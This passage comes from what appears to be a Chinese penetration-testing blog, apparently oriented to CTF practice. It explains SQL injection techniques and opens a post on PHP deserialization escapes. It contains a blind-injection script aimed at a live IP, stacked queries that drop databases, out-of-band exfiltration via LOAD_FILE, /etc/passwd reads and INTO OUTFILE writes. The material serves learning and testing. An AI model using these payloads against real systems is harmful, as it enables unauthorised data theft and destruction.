class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">url =<span class="string">&#x27;http://114.67.175.224:10676/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27;/**/and/**/(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;id=1&#x27;)/**/and/**/(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;biwjlye91i&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)%23&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;id=1&#x27;)/**/and/**/(ascii(mid((select/**/group_concat(secret_V56J)from(biwjlye91i)),&#123;i&#125;,1))&gt;&#123;mid&#125;)%23&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1^(ascii(mid((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;payload&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;password error!&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(r.content):</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>Cookie，User-Agent，Refere</p><p>注入方式大差不差，有的需要编码</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>又名：存储型注入</p><blockquote><p><strong>原理：</strong>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</p></blockquote><p><strong>Example：</strong></p><p>在处理注册登录的时候，对输入的用户名中的敏感字符执行转义操作，进行完对应的SQL查询后再将数据存入数据库。比如：输入了<code>admin&#39; #</code>，网站则会将 ‘ 和 # 转义后进行SQL查询，但是最后存入数据库中的结果仍然是 <code>admin&#39; #</code>（没有存储转义的数据）</p><p>第一次向数据库插入数据存在转义的机制，无法通过第一次SQL的构造就实现注入，但是此时目标数据库中已经存在了SQL注入的注释语句，只要想办法让网站自己去调用这条数据，那么就会造成二次注入</p><p>假设成功登录后，在修改密码时网站会自动从数据库中提取你的用户名，由于网站默认数据库中的数据都是安全的，因此当提取数据库中的用户名 admin’ # 的时候，并不会进行转义操作，而是直接拼接到SQL语句中执行。</p><p>修改密码执行语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$curr_pass&#x27;</span> </span><br></pre></td></tr></table></figure><p>当我们修改密码的时候，网站则会直接提取数据库中的 admin’ # 拼接到SQL语句中执行，变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> #<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>此时我们的用户是 admin’ # 但是却成功的修改了admin账户的密码。这样我们就可以登录admin账户</p><h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><blockquote><p>输入的 ‘ 直接被转义成\了，在一般情况下，此处是不存在SQL注入漏洞的，不过有一个特例，当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式为 %df’，因为反斜杠的编码为 %5c，而在GBK编码中，%df%5c 是繁体字“連”，所以这时，单引号成功逃逸，报出MySQL数据库的错误</p></blockquote><p>数据库转码：mysql_query(“SET NAME gbk”);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=%df&#x27; %23</span><br><span class="line">转为</span><br><span class="line">?id=%df\&#x27; %23</span><br><span class="line">?id=%df%5c&#x27; %23</span><br><span class="line">?id=連&#x27; #</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><blockquote><p><strong>mysqli_multi_query</strong>(<a href="https://www.php.net/manual/zh/class.mysqli.php">mysqli</a> $mysql, string $query): bool</p><p>执行一个或多个由分号分隔的查询</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;show databases;</span><br><span class="line">?id=1&#x27;;show tables;</span><br><span class="line">?id=1&#x27;;show columns from users;</span><br><span class="line">可以插入数据，删除数据，更新数据，修改表名、数据库名......</span><br><span class="line">?id=1&#x27;;drop database security;</span><br><span class="line">?id=1&#x27;;drop table users;</span><br><span class="line">?id=1&#x27;;insert into users(username,password) values(&#x27;happy&#x27;,&#x27;coder&#x27;);</span><br></pre></td></tr></table></figure><h3 id="SQL预处理"><a href="#SQL预处理" class="headerlink" title="SQL预处理"></a>SQL预处理</h3><p>Prepared SQL Statement Syntax （SQL预处理语句语法）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line">stmt_name 是 preparable_stmt（<span class="keyword">SQL</span>语句） 的一个别名</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> <span class="variable">@var_name</span> [, <span class="variable">@var_name</span>] ...];</span><br><span class="line">执行 stmt_name 的语句，可以选择变量</span><br><span class="line"></span><br><span class="line">&#123;<span class="keyword">DEALLOCATE</span> <span class="operator">|</span> <span class="keyword">DROP</span>&#125; <span class="keyword">PREPARE</span> stmt_name;</span><br><span class="line">释放 stmt_name</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@stmt_name1</span>,<span class="variable">@stmt_name2</span>;</span><br><span class="line">对用户变量进行赋值，变量名前没有@就是对局部变量赋值</span><br></pre></td></tr></table></figure><p>将 select * from <code>1919810931114514</code> 进行16进制编码，prepare 会进行编码转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare qwe from @a;execute qwe;%23</span><br></pre></td></tr></table></figure><h3 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h3><p>HANDLER 语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HANDLER table_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] a]</span><br><span class="line">打开表，<span class="keyword">AS</span> a（起别名为a）</span><br><span class="line"></span><br><span class="line">HANDLER table_name READ index_name &#123; <span class="operator">=</span> <span class="operator">|</span> <span class="operator">&lt;=</span> <span class="operator">|</span> <span class="operator">&gt;=</span> <span class="operator">|</span> <span class="operator">&lt;</span> <span class="operator">|</span> <span class="operator">&gt;</span> &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">指定从哪一行开始，通过NEXT继续浏览</span><br><span class="line"></span><br><span class="line">HANDLER table_name READ index_name &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">默认获取数据表第一行，通过将 READ <span class="keyword">FIRST</span> 改成 READ NEXT 依次获取其它行</span><br><span class="line"></span><br><span class="line">HANDLER table_name READ &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，<span class="keyword">LAST</span>获取最后一行（索引最大的一行）</span><br><span class="line"></span><br><span class="line">HANDLER table_name <span class="keyword">CLOSE</span></span><br><span class="line">关闭表</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure><h3 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">RENAME <span class="keyword">TABLE</span> old_name <span class="keyword">TO</span> new_name;</span><br><span class="line">修改表名</span><br><span class="line"> </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> &quot; table_name&quot; <span class="keyword">add</span> &quot; column_name&quot;  type;</span><br><span class="line">添加列</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> &quot; table_name&quot; <span class="keyword">drop</span> &quot; column_name&quot;  type;</span><br><span class="line">删除列</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> &quot; table_name&quot; <span class="keyword">alter</span> <span class="keyword">column</span> &quot; column_name&quot; type;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> &quot; table_name&quot; change &quot; column1&quot; &quot; column2&quot; type;</span><br><span class="line">改变列的数据类型</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> &quot;table_name&quot; rename &quot;column1&quot; <span class="keyword">to</span> &quot;column2&quot;;</span><br><span class="line">修改列名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id int unsigned not Null auto_increment primary key;</span><br><span class="line">设置 id 为无符号整形，该列值不可以为空，并不可以重复，而且自增</span><br><span class="line">PRIMAPY 是主键的意思，表示定义的该列值在表中是唯一的意思，不可以有重复</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to qwe; rename table `1919810931114514` to words;alter table qwe add id int unsigned not Null auto_increment primary key;alter table qwe change flag data varchar(100);#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="keyword">or</span> <span class="number">1</span> #</span><br></pre></td></tr></table></figure><h2 id="外带注入"><a href="#外带注入" class="headerlink" title="外带注入"></a>外带注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(要查询的语句),<span class="string">&#x27;.xx.xx.xx.xx&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="Sql约束攻击"><a href="#Sql约束攻击" class="headerlink" title="Sql约束攻击"></a>Sql约束攻击</h2><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。如”admin”等同于”admin “（admin后有一个空格），查询的结果一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin &#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h2><blockquote><p>Quine: 指的是自产生程序，简单的说，就是输入的sql语句与要输出的一致</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users uname <span class="operator">=</span> &quot;zhangsan&quot;,</span><br><span class="line">    passwd <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(<span class="string">&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;</span>)#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;union/**/select/**/</span></span><br><span class="line"><span class="string">replace(replace(&#x27;</span><span class="number">1</span>&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">replace(&quot;1&#x27;</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(<span class="string">&#x27;.&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;.&#x27;</span>)#&quot;,char(46),&#x27;1&quot;<span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span><span class="number">1</span><span class="string">&#x27;union/**/select/**/replace(replace(&#x27;</span><span class="number">1</span>&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><h2 id="Privileges"><a href="#Privileges" class="headerlink" title="Privileges"></a>Privileges</h2><p>当前用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>()</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_USER</span>()</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">from</span> mysql.user</span><br></pre></td></tr></table></figure><p>是否具有超级管理员权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> super_priv <span class="keyword">FROM</span> mysql.user# Y <span class="operator">|</span> N</span><br></pre></td></tr></table></figure><p>显示当前用户<code>root</code>权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> grantee, privilege_type <span class="keyword">FROM</span> information_schema.user_privileges <span class="keyword">WHERE</span> grantee<span class="operator">=</span>&quot;&#x27;root&#x27;@&#x27;localhost&#x27;&quot;</span><br></pre></td></tr></table></figure><h3 id="LOAD-FILE"><a href="#LOAD-FILE" class="headerlink" title="LOAD_FILE"></a>LOAD_FILE</h3><p>读取文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Writing-Files"><a href="#Writing-Files" class="headerlink" title="Writing Files"></a>Writing Files</h3><p>条件：</p><ol><li><code>FILE</code>已启用权限的用户</li><li>MySQL 全局<code>secure_file_priv</code>变量未启用</li><li>对服务器上我们要写入的位置具有写权限</li></ol><p>查看 <code>secure_file_priv</code> 权限，值为空，则可以读取&#x2F;写入文件到任意位置。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;secure_file_priv&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> variable_name, variable_value <span class="keyword">FROM</span> information_schema.global_variables <span class="keyword">where</span> variable_name<span class="operator">=</span>&quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure><p>写入文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/credentials&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;this is a test&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/test.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Php Unserialize</title>
      <link href="/2023/06/30/php/Unserialize/"/>
      <url>/2023/06/30/php/Unserialize/</url>
      
        <content type="html"><![CDATA[<h1 id="Php-Unserialize"><a href="#Php-Unserialize" class="headerlink" title="Php Unserialize"></a>Php Unserialize</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>();  <span class="comment"># 创建一个对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);  <span class="comment"># 把这个对象进行序列化</span></span><br><span class="line"></span><br><span class="line">序列化后得到的结果是这个样子的:</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">O:代表<span class="keyword">object</span></span><br><span class="line"><span class="number">1</span>:代表对象名字长度为一个字符</span><br><span class="line">S:对象的名称</span><br><span class="line"><span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">s:数据类型</span><br><span class="line"><span class="number">4</span>:变量名称的长度</span><br><span class="line">test:变量名称</span><br><span class="line">s:数据类型</span><br><span class="line"><span class="number">7</span>:变量值的长度</span><br><span class="line">pikachu:变量值</span><br></pre></td></tr></table></figure><blockquote><p><code>private</code> 和 <code>protected</code> 详解</p><p>PHP序列化的时候 private 和 protected 变量会引入不可见字符%00，<br><code>%00类名%00属性名</code> 为private，<code>%00*%00属性名</code> 为protected，注意这两个 %00就是 ascii 码为0 的字符。</p><p>这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚.我们可以将序列化的字符用urlencode编码之后,打印出来查看。</p></blockquote><p><strong>魔术方法</strong></p><table><thead><tr><th>方法</th><th>触发条件</th><th>参数</th><th>返回值</th><th></th></tr></thead><tbody><tr><td>__construct</td><td>实例化对象</td><td></td><td></td><td></td></tr><tr><td>__destruct</td><td>反序列化之后 销毁之后</td><td></td><td></td><td></td></tr><tr><td>__sleep</td><td>序列化之前</td><td></td><td>需要被序列化的成员属性</td><td></td></tr><tr><td>__wakeup</td><td>反序列化之前</td><td></td><td></td><td></td></tr><tr><td>__toString</td><td>把对象当成字符串使用</td><td></td><td></td><td></td></tr><tr><td>__invoke</td><td>把对象当成函数调用</td><td></td><td></td><td></td></tr><tr><td>__clone</td><td>当使用clone关键字拷贝完一个对象</td><td></td><td></td><td></td></tr><tr><td>__call</td><td>调用不存在的方法或者私有的属性</td><td>$arg1,$arg2</td><td>不存在的方法名称&amp;参数</td><td></td></tr><tr><td>__callStatic</td><td>静态调用不存在的方法</td><td>$arg1,$arg2</td><td>不存在的方法名称&amp;参数</td><td></td></tr><tr><td>__get</td><td>调用成员属性不存在</td><td>$arg1</td><td>不存在的成员属性名称</td><td></td></tr><tr><td>__set</td><td>给不存在的成员属性赋值</td><td>$arg1,$arg2</td><td>不存在的成员名称&amp;值</td><td></td></tr><tr><td>__isset</td><td>对不可访问属性使用isset()或empty</td><td>$arg1</td><td>不存在的成员属性名称</td><td></td></tr><tr><td>__unset</td><td>对不可访问属性使用unset()</td><td>$arg1</td><td>不存在的成员属性名称</td><td></td></tr></tbody></table><blockquote><p><code>__wakeup()</code>函数漏洞绕过原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就不会执行</p></blockquote><h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h2><p><strong>str_replace</strong> — 子字符串替换</p><blockquote><p><strong>str_replace</strong>(<br>array|string <code>$search</code>,<br>array|string <code>$replace</code>,<br>string|array <code>$subject</code>,<br>int <code>&amp;$count</code> &#x3D; <strong><code>null</code></strong><br>): string|array</p><ul><li><p><code>search</code></p><p>查找的目标值，也就是 <em>needle</em>，一个数组可以指定多个目标。       </p></li><li><p><code>replace</code></p><p><code>search</code> 的替换值，一个数组可以被用来指定多重替换       </p></li><li><p><code>subject</code></p><p>执行替换的数组或者字符串。也就是 <em>haystack</em></p><p>如果 <code>subject</code> 是一个数组，替换操作将遍历整个 <code>subject</code>，返回值也将是一个数组。       </p></li><li><p><code>count</code></p><p>如果被指定，它的值将被设置为替换发生的次数</p></li></ul><p><strong>返回值</strong></p><p>该函数返回替换后的数组或者字符串。 </p></blockquote><h3 id="增多逃逸"><a href="#增多逃逸" class="headerlink" title="增多逃逸"></a>增多逃逸</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;shell2&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span 